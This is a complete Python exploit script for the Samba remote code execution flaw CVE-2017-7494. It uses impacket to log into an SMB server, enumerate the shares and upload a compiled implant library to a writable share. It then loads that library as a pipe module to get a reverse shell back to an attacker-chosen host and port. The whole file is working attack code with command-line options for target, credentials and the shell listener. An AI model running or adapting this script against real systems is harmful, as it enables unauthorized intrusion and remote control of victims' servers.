#!/usr/bin/python

"""
Exploit for CVE-2017-7494 by Joxean Koret
joxeankoret AT yah00 DOT es

Update by archivaldo.
"""

import os
import sys
import time
import random
import socket
import string

from multiprocessing import Process

from optparse import OptionParser
from impacket.dcerpc.v5 import transport, srvs
from impacket.smbconnection import SMBConnection

#-------------------------------------------------------------------------------
CONFIG_H = """#define SHELL_PORT %s
#define SHELL_HOST "%s"
#define SHELL_BINARY "%s"
#define USE_OLD_ENTRYPOINT %s
"""

#-------------------------------------------------------------------------------
LAST_MSG = None
def log(msg):
  global LAST_MSG
  
  show = False
  if LAST_MSG is None:
    show = True
  elif LAST_MSG != msg:
    show = True

  LAST_MSG = msg
  print "[%s] %s" % (time.asctime(), msg)

#-------------------------------------------------------------------------------
class CSmbExploit:
  def __init__(self, options):
    self.hostname = options.host
    self.port = options.port
    self.sambaTarget = options.sambaTarget
    self.sambaPort = options.sambaPort
    self.module = options.module
    self.username = options.username
    self.sambaOld = options.sambaVersion
    self.noimplant = options.noimplant
    self.customBinary = options.customBinary
    
    if self.username is None:
      self.username = ""
    self.password = options.password
    if self.password is None:
      self.password = ""
    
    self.is_32bit = options.is_32
    self.shell = options.shell

    self.smb = None

  def load_module(self, module):
    if int(self.sambaOld) == 1:
	  module = '\\\PIPE\\' + module  
    
    log("Trying to load module %s" % module)
    stringbinding = r'ncacn_np:%s[\pipe\%s]' % (self.sambaTarget, module)
    sb = transport.DCERPCStringBinding(stringbinding)
    na = sb.get_network_address()
    rpctransport = transport.SMBTransport(na, filename = module, smb_connection = self.smb)
    dce = rpctransport.get_dce_rpc()

    try:
      dce.connect()
      return True
    except KeyboardInterrupt:
      print "Aborted."
      sys.exit(0)
    except:
      log("Error: %s" % str(sys.exc_info()[1]))
      return False

  def get_my_ip(self):
    return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1]

  def get_random_name(self, total=8):
    ret = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(total))
    return "%s.so" % ret

  def make_library(self):
	  
    if (int(self.noimplant)) or (len(self.customBinary) > 1) == 1:
      log("I will keep the current binaries. No need for new compilation.")
      return True
    
    if self.hostname is None:
      l = self.get_my_ip()
      if len(l) == 0:
        raise Exception("Cannot resolve local IP address!")

      self.hostname = l[0]

    with open("config.h", "wb") as f:
      f.write(CONFIG_H % (self.port, self.hostname, self.shell, self.sambaOld))

    log("Building libraries...")
    ret = os.system("make")
    return ret == 0

  def try_put(self, share_name, lib_name, real_file):
    with open(real_file, "rb") as f:
      try:
        self.smb.putFile(share_name[0], lib_name, f.read)
        return True
      except:
        log("Error copying file: %s" % str(sys.exc_info()[1]))

    return False

  def get_real_library_name(self):
    # XXX: TODO: Add support for non Intel based machines
    if self.is_32bit:
      return "libimplantx32.so"
    return "libimplantx64.so"

  def translate_smb_path(self, path):
    pos = path.find(":")
    if pos > -1:
      path = path[pos+1:]
      path = path.replace("\\", "/")
    return path

  def try_copy_library(self, lib_name):
    rpctransport = transport.SMBTransport(self.smb.getRemoteName(), self.smb.getRemoteHost(),
                                          filename=r'\srvsvc', smb_connection=self.smb)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(srvs.MSRPC_UUID_SRVS)
    resp = srvs.hNetrShareEnum(dce, 2)

    l = []
    ignore_shares = ["print$", "IPC$"]
    for share in resp['InfoStruct']['ShareInfo']['Level2']['Buffer']:
      share_name = share['shi2_netname'][:-1]
      share_path = self.translate_smb_path(share['shi2_path'][:-1])
      l.append([share_name, share_path])

    # Randomize the list of shares instead of going from the first to the last
    random.shuffle(l)
    
    if len(self.customBinary) < 1:
      real_file = self.get_real_library_name()
    else:
      real_file = self.customBinary
    
    log("Using  %s" % real_file)
    for share in l:
      log("Trying to copy library '%s' to share '%s'" % (lib_name, share))
      if self.try_put(share, lib_name, real_file):
        log("Done!")
        return share[1]

    return None

  def do_login(self):
    try:
      self.smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=self.sambaTarget, sess_port=int(self.sambaPort))
      self.smb.login(user=self.username, password=self.password)
      if self.smb.isGuestSession():
        log("Using a GUEST session")
      return True
    except:
      log("Error logging into the Samba server: %s" % str(sys.exc_info()[1]))
      return False

  def exploit(self):
    
    if not self.make_library():
        log("Error building library:")
        return False
    
    log("Logging into the Samba server %s:%s" % (self.sambaTarget, self.sambaPort))
    if not self.do_login():
      log("Cannot log into the Samba server...")
      return False

    lib_name = self.get_random_name()
    
    if self.module is None:
      server_directory = self.try_copy_library(lib_name)
      log("Trying to copy random library %s" % lib_name)
      if server_directory is None:
        log("Unable to copy the payload to the target :(")
        return False
      
      self.module = "%s/%s" % (server_directory, lib_name)
    else:
      lib_name = self.module

    return self.load_module(self.module)

#-------------------------------------------------------------------------------
def main():
  parser = OptionParser()
  
  parser.add_option("-t", "--target", dest="sambaTarget", help="target ip address")
  parser.add_option("-p", "--port", dest="sambaPort", default=445, help="target port")
  
  msg = "module path on target server (do not use to auto-resolve the module's path)"
  parser.add_option("-m", "--module", dest="module", help=msg)
  
  msg = "Use a 32 bit payload (by default, it uses a x86_64 one)"
  parser.add_option("-x", "--use-x32", dest="is_32", default=False, help=msg)
  
  msg = "Shell to use (by default /bin/sh)"
  parser.add_option("-s", "--shell", dest="shell", default="/bin/sh", help=msg)
  
  msg = "Use old entry point for share library (samba 3.5.0 / 3.6.0))"
  parser.add_option("-o", "--old-version", dest="sambaVersion", default=0, help=msg)
  
  msg = "Do not compile libimplant*.so"
  parser.add_option("-n", "--no-compile", dest="noimplant", default=0, help=msg)
  
  #login
  msg = "Username to login into the Samba server"
  parser.add_option("-u", "--username", dest="username", help=msg)
  msg = "Password to login into the Samba server"
  parser.add_option("-P", "--password", dest="password", help=msg)
  
  #reverse shell
  msg = "Hostname for reverse shell"
  parser.add_option("--rhost", dest="host", help=msg)
  msg = "Port for reverse shell"
  parser.add_option("--rport", dest="port", default=31337, help=msg)
  
  msg = "Use this option if you need to run a custom .so"
  parser.add_option("--custom", dest="customBinary", default="", help=msg)
  
  (options, args) = parser.parse_args()
  if options.sambaTarget:
    exploit = CSmbExploit(options)
    if exploit.exploit():
      log("Success! You should have a reverse shell by now :)")
  else:
    parser.print_help()

if __name__=="__main__":
  main()
